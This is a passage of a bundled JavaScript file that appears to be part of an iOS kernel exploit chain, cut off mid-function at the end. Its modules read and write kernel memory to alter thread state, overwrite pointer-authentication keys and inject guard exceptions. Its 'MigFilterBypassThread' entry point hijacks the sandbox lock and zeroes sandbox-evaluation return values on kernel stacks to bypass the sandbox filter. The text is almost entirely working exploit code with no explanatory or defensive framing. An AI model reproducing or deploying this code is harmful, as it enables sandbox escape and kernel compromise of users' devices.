first;\n\t}\n\n\tstatic getMap(taskAddr)\n\t{\n\t\tlet vmMap = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].read64(taskAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__[\"default\"].offsets().mapTask);\n\t\treturn vmMap;\n\t}\n\n\tstatic getPortKObjectOfTask(taskAddr,port)\n\t{\n\t\tlet portObject = this.getPortAddrOfTask(taskAddr, port);\n\t\treturn this.#getPortKObjectByAddr(portObject);\n\t}\n\n\tstatic getPortAddrOfTask(taskAddr, port)\n\t{\n\t\tlet spaceTable = this.#getSpaceTable(taskAddr);\n\t\treturn this.#getPortObject(spaceTable, port);\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/TaskRop.js\":\n/*!*************************************!*\\\n  !*** ./src/libs/TaskRop/TaskRop.js ***!\n  \\*************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ TaskRop)\n/* harmony export */ });\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./Task */ \"./src/libs/TaskRop/Task.js\");\n\n\n\n\nconst TAG = \"TASKROP\"\n\nclass TaskRop\n{\n\tstatic init()\n\t{\n\t\tlet selfTaskAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].getSelfTaskAddr();\n\t\tif (!selfTaskAddr)\n\t\t{\n\t\t\tconsole.log(TAG,`Unable to find self task address`);\n\t\t\treturn;\n\t\t}\t\n\t\tconsole.log(TAG,`selfTaskAddr:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].hex(selfTaskAddr)}`);\n\t\t_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].init(selfTaskAddr);\n\t}\n}\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/Thread.js\":\n/*!************************************!*\\\n  !*** ./src/libs/TaskRop/Thread.js ***!\n  \\************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ Thread)\n/* harmony export */ });\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./ThreadState */ \"./src/libs/TaskRop/ThreadState.js\");\n/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/Chain/Native */ \"./src/libs/Chain/Native.js\");\n\n\n\n\n\nconst AST_GUARD = 0x1000;\nconst TAG = \"THREAD\";\n\nclass Thread\n{\n\tstatic getTro(thread)\n\t{\n\t\tlet tro = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().tro);\n\t\t// Ignore threads with invalid tro address.\n\t\tif (!(tro & 0xf000000000000000n))\n\t\t{\n\t\t\t//console.log(TAG,`Got invalid tro of thread:${Utils.hex(thread)} and value:${Utils.hex(tro)}`);\n\t\t\treturn 0n;\n\t\t}\n\t\treturn tro;\n\t}\n\tstatic getCtid(thread)\n\t{\n\t\tlet ctid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ctid);\n\t\treturn ctid;\n\t}\n\tstatic getTask(thread)\n\t{\n\t\tlet tro = this.getTro(thread);\n\t\t// Ignore threads with invalid tro address.\n\t\tif (!(tro & 0xf000000000000000n) || tro === 0n)\n\t\t\treturn 0n;\n\t\tlet task = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(tro + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().troTask);\n\t\treturn task;\n\t}\n\tstatic next(thread)\n\t{\n\t\tif (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].strip(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().taskThreads) < 0xffffffd000000000n)\n\t\t\treturn 0;\n\t\tlet next = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().taskThreads);\n\t\tif (next < 0xffffffd000000000n)\n\t\t\treturn 0;\n\t\treturn next;\n\t}\n\tstatic setMutex(thread,ctid)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().mutexData, ctid);\n\t}\n\tstatic getMutex(thread)\n\t{\n\t\tlet mutex = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().mutexData);\n\t\treturn mutex;\n\t}\n\tstatic getStack(thread)\n\t{\n\t\tlet stackptr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().kstackptr);\n\t\treturn stackptr;\n\t}\n\tstatic injectGuardException(thread,code)\n\t{\n\t\tif(!this.getTro(thread))\n\t\t{\n\t\t\tconsole.log(TAG,`got invalid tro of thread, not injecting exception since thread is dead`);\n\t\t\treturn false;\n\t\t}\n\n\t\t// 18.4+\n\t\tif (xnuVersion.major == 24 && xnuVersion.minor >= 4) {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0x17n);\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode + 0x8n, code);\n\t\t}\n\t\telse {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, code);\n\t\t}\n\n\t\tlet ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast);\n\t\tast |= AST_GUARD;\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast, ast);\n\t\treturn true;\n\t}\n\tstatic clearGuardException(thread)\n\t{\n\t\tif(!this.getTro(thread))\n\t\t{\n\t\t\tconsole.log(TAG,`got invalid tro of thread, still clearing exception to avoid crash`);\n\t\t}\n\t\tlet ast = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast);\n\t\tast &= ~AST_GUARD | 0x80000000;\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write32(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ast, ast);\n\n\t\t// 18.4+\n\t\tif (xnuVersion.major == 24 && xnuVersion.minor >= 4) {\n\t\t\tif (libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode) == 0x17n) {\n\t\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0n);\n\t\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode + 0x8n, 0n);\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().guardExcCode, 0n);\n\t\t}\n\t}\n\tstatic getOptions(thread)\n\t{\n\t\tlet options = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().options);\n\t\treturn options;\n\t}\n\tstatic setOptions(thread, options)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write16(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().options, options);\n\t}\n\tstatic getRopPid(thread)\n\t{\n\t\tlet ropPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ropPid);\n\t\treturn ropPid;\n\t}\n\tstatic getJopPid(thread)\n\t{\n\t\tlet jopPid = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().jopPid);\n\t\treturn jopPid;\n\t}\n\tstatic setPACKeys(thread, keyA, keyB)\n\t{\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().ropPid, keyA);\n\t\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].write64(thread + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__[\"default\"].offsets().jopPid, keyB);\n\t}\n\n\tstatic getState(machThread)\n\t{\n\t\tlet statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\tlet stateCountPtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem + 0x200n;\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].write32(stateCountPtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_COUNT);\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_get_state\",\n\t\t\tmachThread,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64,\n\t\t\tstatePtr,\n\t\t\tstateCountPtr);\n\t\tif (kr != 0) {\n\t\t\tconsole.log(TAG, \"Unable to read thread state\");\n\t\t\treturn false;\n\t\t}\n\n\t\tlet stateBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].read(statePtr, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_SIZE);\n\t\tlet state = new _ThreadState__WEBPACK_IMPORTED_MODULE_2__[\"default\"](stateBuff);\n\t\treturn state;\n\t}\n\n\tstatic setState(machThread, threadAddr, state)\n\t{\n\t\tlet options = 0;\n\t\tif (threadAddr) {\n\t\t\toptions = Thread.getOptions(threadAddr);\n\t\t\toptions |= 0x8000;\n\t\t\tThread.setOptions(threadAddr, options);\n\t\t}\n\n\t\tlet statePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].mem;\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].write(statePtr, state.buffer);\n\t\t//console.log(TAG,`thread:${Utils.hex(thread)}`);\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_set_state\",\n\t\t\tmachThread,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64,\n\t\t\tstatePtr,\n\t\t\tlibs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_1__[\"default\"].ARM_THREAD_STATE64_COUNT);\n\t\tif (kr != 0)\n\t\t{\n\t\t\tconsole.log(TAG,`Failed thread_set_state with error:${kr}`);\n\t\t\treturn false;\n\t\t}\n\n\t\tif (threadAddr) {\n\t\t\toptions &= ~0x8000;\n\t\t\tThread.setOptions(threadAddr, options);\n\t\t}\n\t\treturn true;\n\t}\n\n\tstatic resume(machThread)\n\t{\n\t\tlet kr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_3__[\"default\"].callSymbol(\"thread_resume\", machThread);\n\t\tif (kr != 0) {\n\t\t\tconsole.log(TAG, \"Unable to resume suspended thread\");\n\t\t\treturn false;\n\t\t}\n\t\treturn true;\n\t}\n}\n\n\n/***/ }),\n\n/***/ \"./src/libs/TaskRop/ThreadState.js\":\n/*!*****************************************!*\\\n  !*** ./src/libs/TaskRop/ThreadState.js ***!\n  \\*****************************************/\n/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {\n\n__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": () => (/* binding */ ThreadState)\n/* harmony export */ });\n/* harmony import */ var _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./RegistersStruct */ \"./src/libs/TaskRop/RegistersStruct.js\");\n\n\nclass ThreadState\n{\n\t#buffer;\n\t#dataView;\n\tconstructor(buffer, offset = 0)\n\t{\n\t\tthis.#buffer = buffer;\n\t\tthis.#dataView = new DataView(buffer,offset);\n\t\tthis.registers = new _RegistersStruct__WEBPACK_IMPORTED_MODULE_0__[\"default\"](buffer,offset);\n\t}\n\tget buffer()\n\t{\n\t\treturn this.#buffer;\n\t}\n\tget opaque_fp()\n\t{\n\t\treturn this.#dataView.getBigUint64(232,true);\n\t}\n\tset opaque_fp(value)\n\t{\n\t\tthis.#dataView.setBigUint64(232,value,true);\n\t}\n\tget opaque_lr()\n\t{\n\t\treturn this.#dataView.getBigUint64(240,true);\n\t}\n\tset opaque_lr(value)\n\t{\n\t\tthis.#dataView.setBigUint64(240,value,true);\n\t}\n\tget opaque_sp()\n\t{\n\t\treturn this.#dataView.getBigUint64(248,true);\n\t}\n\tset opaque_sp(value)\n\t{\n\t\tthis.#dataView.setBigUint64(248,value,true);\n\t}\n\tget opaque_pc()\n\t{\n\t\treturn this.#dataView.getBigUint64(256,true);\n\t}\n\tset opaque_pc(value)\n\t{\n\t\tthis.#dataView.setBigUint64(256,value,true);\n\t}\n\tget cpsr()\n\t{\n\t\treturn this.#dataView.getUint32(264,true);\n\t}\n\tset cpsr(value)\n\t{\n\t\tthis.#dataView.setUint32(264,value,true);\n\t}\n\tget opaque_flags()\n\t{\n\t\treturn this.#dataView.getUint32(268,true);\n\t}\n\tset opaque_flags(value)\n\t{\n\t\tthis.#dataView.setUint32(268,value,true);\n\t}\n}\n\n/***/ })\n\n/******/ \t});\n/************************************************************************/\n/******/ \t// The module cache\n/******/ \tvar __webpack_module_cache__ = {};\n/******/ \t\n/******/ \t// The require function\n/******/ \tfunction __webpack_require__(moduleId) {\n/******/ \t\t// Check if module is in cache\n/******/ \t\tvar cachedModule = __webpack_module_cache__[moduleId];\n/******/ \t\tif (cachedModule !== undefined) {\n/******/ \t\t\treturn cachedModule.exports;\n/******/ \t\t}\n/******/ \t\t// Create a new module (and put it into the cache)\n/******/ \t\tvar module = __webpack_module_cache__[moduleId] = {\n/******/ \t\t\t// no module.id needed\n/******/ \t\t\t// no module.loaded needed\n/******/ \t\t\texports: {}\n/******/ \t\t};\n/******/ \t\n/******/ \t\t// Execute the module function\n/******/ \t\t__webpack_modules__[moduleId](module, module.exports, __webpack_require__);\n/******/ \t\n/******/ \t\t// Return the exports of the module\n/******/ \t\treturn module.exports;\n/******/ \t}\n/******/ \t\n/************************************************************************/\n/******/ \t/* webpack/runtime/define property getters */\n/******/ \t(() => {\n/******/ \t\t// define getter functions for harmony exports\n/******/ \t\t__webpack_require__.d = (exports, definition) => {\n/******/ \t\t\tfor(var key in definition) {\n/******/ \t\t\t\tif(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {\n/******/ \t\t\t\t\tObject.defineProperty(exports, key, { enumerable: true, get: definition[key] });\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t};\n/******/ \t})();\n/******/ \t\n/******/ \t/* webpack/runtime/hasOwnProperty shorthand */\n/******/ \t(() => {\n/******/ \t\t__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))\n/******/ \t})();\n/******/ \t\n/******/ \t/* webpack/runtime/make namespace object */\n/******/ \t(() => {\n/******/ \t\t// define __esModule on exports\n/******/ \t\t__webpack_require__.r = (exports) => {\n/******/ \t\t\tif(typeof Symbol !== 'undefined' && Symbol.toStringTag) {\n/******/ \t\t\t\tObject.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });\n/******/ \t\t\t}\n/******/ \t\t\tObject.defineProperty(exports, '__esModule', { value: true });\n/******/ \t\t};\n/******/ \t})();\n/******/ \t\n/************************************************************************/\nvar __webpack_exports__ = {};\n// This entry needs to be wrapped in an IIFE because it needs to be isolated against other modules in the chunk.\n(() => {\n/*!**************************************!*\\\n  !*** ./src/MigFilterBypassThread.js ***!\n  \\**************************************/\n__webpack_require__.r(__webpack_exports__);\n/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ \"./src/libs/Chain/Native.js\");\n/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ \"./src/libs/Chain/Chain.js\");\n/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/Task */ \"./src/libs/TaskRop/Task.js\");\n/* harmony import */ var libs_TaskRop_Thread__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Thread */ \"./src/libs/TaskRop/Thread.js\");\n/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/TaskRop/TaskRop */ \"./src/libs/TaskRop/TaskRop.js\");\n/* harmony import */ var libs_JSUtils_Logger__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/JSUtils/Logger */ \"./src/libs/JSUtils/Logger.js\");\n/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! libs/JSUtils/Utils */ \"./src/libs/JSUtils/Utils.js\");\n/* harmony import */ var libs_Driver_DriverNewThread__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! libs/Driver/DriverNewThread */ \"./src/libs/Driver/DriverNewThread.js\");\n\n\n\n\n\n\n\n\n\nconst TAG = \"MIG_FILTER_BYPASS\";\n\nconst RUN_FLAG_STOP = 0;\nconst RUN_FLAG_RUN = 1;\nconst RUN_FLAG_PAUSE = 2;\n\nfunction disarm_gc() {\n\n\tlet vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);\n\tlet heap = vm + 0xc0n;\n\tlet m_threadGroup = uread64(heap + 0x198n);\n\tlet threads = uread64(m_threadGroup);\n\tuwrite64(threads + 0x20n, 0x0n);\n\t// LOG(\"[+] gc disarmed\");\n}\n\nfunction kstrip(addr) {\n\treturn addr | 0xffffff8000000000n;\n}\n\nfunction lockSandboxLock() {\n\t// Find \"_duplicate_lock\" address, which is a \"lck_rw_t\"\n\tconst lockAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migLock;\n\tconst sbxMessageAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migSbxMsg;\n\n\t//console.log(TAG, \"kernelSlide: \" + Utils.hex(kernelSlide));\n\t//console.log(TAG, \"lockAddr: \" + Utils.hex(lockAddr));\n\t//console.log(TAG, \"sbxMessageAddr: \" + Utils.hex(sbxMessageAddr));\n\n\tlet lockBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\t//for (let i=0, j=0; i<16; i+=4, j++)\n\t//\tconsole.log(TAG, `${Utils.hex(i)}: ${Utils.hex(lockBuff32[j]).padStart(8, '0')}`);\n\n\tlet lockData = lockBuff32[2];\n\tlockData |= 0x410000;\t// interlock + can_sleep\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write32(lockAddr + 0x8n, lockData);\n\n\t// Do we need to clear this addr while locking too? Or maybe just when we unlock is enough?\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(sbxMessageAddr, 0n);\n}\n\nfunction unlockSandboxLock() {\n\tconst lockAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migLock;\n\tconst sbxMessageAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migSbxMsg;\n\n\t\n\t// clear the sbx message buffer (pointer) used to check for duplicate messages.\n\t// This should solve an issue with sfree() if we unlock and lock sandbox quick enough.\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(sbxMessageAddr, 0n);\n\n\tlet lockBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\n\tlet lockData = lockBuff32[2];\n\tlockData &= ~0x10000;\t// interlock\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write32(lockAddr + 0x8n, lockData);\n}\n\nfunction dumpKMem(addr, size) {\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].read(addr, libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].mem, size);\n\tlet buff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].mem, size);\n\tlet buff64 = new BigUint64Array(buff);\n\tfor (let i=0, j=0; i<size; i+=8, j++) {\n\t\tlet bits = buff64[j] & 0xfffn;\n\t\tif (bits === 0x4a4n)\n\t\t\tconsole.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(buff64[j]).padStart(16, '0')} <<< FOUND ?`);\n\t\telse\n\t\t\tconsole.log(TAG, `[${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(addr + BigInt(i))}] ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(i)}: ${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(buff64[j]).padStart(16, '0')}`);\n\t}\n}\n\nfunction findReturnValueOffs(addr) {\n\t// Read from thread kstack, page aligned\n\tconst READ_SIZE = 0x1000;\n\t//Chain.read(addr, Native.mem, READ_SIZE);\n\tlet pageAddr = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].trunc_page(addr);\n\tlet startAddr = pageAddr + 0x3000n;\n\tlet buff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].readBuff(startAddr, READ_SIZE);\n\tif (!buff)\n\t\treturn false;\n\tlet buff64 = new BigUint64Array(buff);\n\tlet expectedLR = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].getKernelBase() + migKernelStackLR;\n\n\t// Look for 0xxxxxxxxxxxxxx4a4 value, which should be the LSB of LR pointing to Sandbox.kext inside\n\t// \"_sb_evaluate_internal()\", so meaning we found the function stack we need (_sb_eval).\n\tfor (let i=0, j=0; i<READ_SIZE; i+=8, j++) {\n\t\tlet val = kstrip(buff64[j]);\n\t\tif (val === expectedLR) {\n\t\t\t//console.log(TAG, `Matching LR found at ${Utils.hex(startAddr + BigInt(i))}: ${Utils.hex(buff64[j])}`);\n\n\t\t\t// The return value of _eval() is stored in the stack at -40 bytes from LR.\n\t\t\tlet offs = startAddr + BigInt(i - 40);\n\t\t\treturn offs;\n\t\t}\n\t}\n\treturn false;\n}\n\nfunction disableFilterOnThread(threadAddr) {\n\t//console.log(TAG, \"Read kstack of thread: \" + Utils.hex(threadAddr));\n\tlet kstack = libs_TaskRop_Thread__WEBPACK_IMPORTED_MODULE_3__[\"default\"].getStack(threadAddr);\n\tif (!kstack)\n\t\treturn false;\n\n\tkstack = kstrip(kstack);\n\tlet kernelSPOffset = BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].UINT64_SIZE * 12);\n\tlet kernelSP = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].read64(kstack + kernelSPOffset);\n\tif (!kernelSP)\n\t\treturn false;\n\n\t//console.log(TAG, \"kstack:   \" + Utils.hex(kstack));\n\t//console.log(TAG, \"kernelSP: \" + Utils.hex(kernelSP));\n\n\t//dumpKMem(kstack, 0x70);\n\t//dumpKMem(kernelSP, 0x1000);\n\n\t//console.log(TAG, \"Possible MIG syscall with thread: \" + Utils.hex(threadAddr));\n\n\tlet offs = findReturnValueOffs(kernelSP);\n\tif (!offs) {\n\t\t//console.log(TAG, \"Unable to find offset\");\n\t\treturn false;\n\t}\n\n\t//console.log(TAG, \"Offs found at: \" + Utils.hex(offs));\n\n\tlibs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__[\"default\"].write64(offs, 0n);\n\n\tconsole.log(TAG, \"MIG syscall intercepted for thread: \" + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_6__[\"default\"].hex(threadAddr));\n\n\treturn true;\n}\n\nfunction waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, timeout=5000) {\n\t//console.log(TAG, \"Wait for MIG syscall...\");\n\tlet startTimestamp = Date.now();\n\n\twhile (true) {\n\t\tlet runBypassFlag = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(runBypassFlagPtr);\n\t\tif (!runBypassFlag)\n\t\t\treturn RUN_FLAG_STOP;\n\t\tif (runBypassFlag == RUN_FLAG_PAUSE)\n\t\t\treturn RUN_FLAG_PAUSE;\n\n\t\tif (timeout && (Date.now() - startTimestamp >= timeout)) {\n\t\t\tconsole.log(TAG, \"Timeout waiting for a syscall\");\n\t\t\tbreak;\n\t\t}\n\n\t\tlet filterTriggered = false;\n\t\tlet monitorThread1 = monitorThread1Ptr ? libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(monitorThread1Ptr) : false;\n\t\tlet monitorThread2 = monitorThread2Ptr ? libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read64(monitorThread2Ptr) : false;\n\n\t\tif (monitorThread1 && monitorThread2) {\n\t\t\t//console.log(TAG, \"check monitored threads\");\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread1);\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread2);\n\t\t}\n\t\telse {\n\t\t\t//console.log(TAG, \"Waiting for monitored threads...\");\n\t\t}\n\t\t\n\t\tif (filterTriggered)\n\t\t\tbreak;\n\n\t\t//console.log(TAG, \"No MIG syscall detected\");\n\n\t\tlibs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].callSymbol(\"usleep\", 50000);\n\t}\n\t//console.log(TAG, \"MIG syscall intercepted!\");\n\treturn RUN_FLAG_RUN;\n}\n\nfunction startFilterBypass(runBypassFlagPtr) {\n\tlet run = RUN_FLAG_PAUSE;\n\n\tlet selfTaskAddr = libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_2__[\"default\"].gSelfTask.addr;\n\n\twhile (run) {\n\t\tif (run == RUN_FLAG_PAUSE) {\n\t\t\tconsole.log(TAG, \"Pausing filter bypass\");\n\t\t\twhile (true) {\n\t\t\t\trun = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__[\"default\"].read32(runBypassFlagPtr);\n\t\t\t\tif (run != 